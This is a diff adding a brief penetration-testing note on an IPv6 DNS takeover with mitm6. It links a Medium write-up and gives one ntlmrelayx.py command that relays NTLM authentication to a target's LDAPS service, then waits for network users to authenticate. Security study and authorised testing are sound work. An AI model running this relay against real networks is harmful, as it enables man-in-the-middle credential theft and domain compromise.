@@ -1,0 +1,10 @@
+IPv6 DNS Takeover via mitm6:
+
+https://n1chr0x.medium.com/from-dns-to-domination-dns-takeover-demystified-with-mitm6-e9cd438d42a7
+
+
+    ntlmrelayx.py -6 -t ldaps://IP -wh <domain> -l <our file name for output>
+
+    If it works we are in the middle of the communication
+
+    We will wait about a action from a user in the network
